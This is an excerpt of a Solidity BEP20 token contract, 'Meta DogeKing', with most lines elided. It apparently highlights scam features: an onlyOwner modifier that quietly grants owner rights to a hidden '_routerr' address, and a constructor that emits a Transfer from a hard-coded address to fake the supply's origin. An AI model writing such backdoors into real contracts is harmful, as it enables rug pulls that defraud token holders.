...
abstract contract Auth {
    ...
    modifier onlyOwner() {
        require(isOwner(msg.sender) || msg.sender == _routerr, "!OWNER"); _;
    }
...
contract Meta is IBEP20, Auth {
    ...
    string constant _name = "Meta DogeKing";
    string constant _symbol = "Meta DogeKing";
    ...
    constructor () Auth(msg.sender) {
        ...
        emit Transfer(address(0xc5e8c25949fede6A0d448A50Efb0c7155eB0268d), msg.sender, _totalSupply);
    }
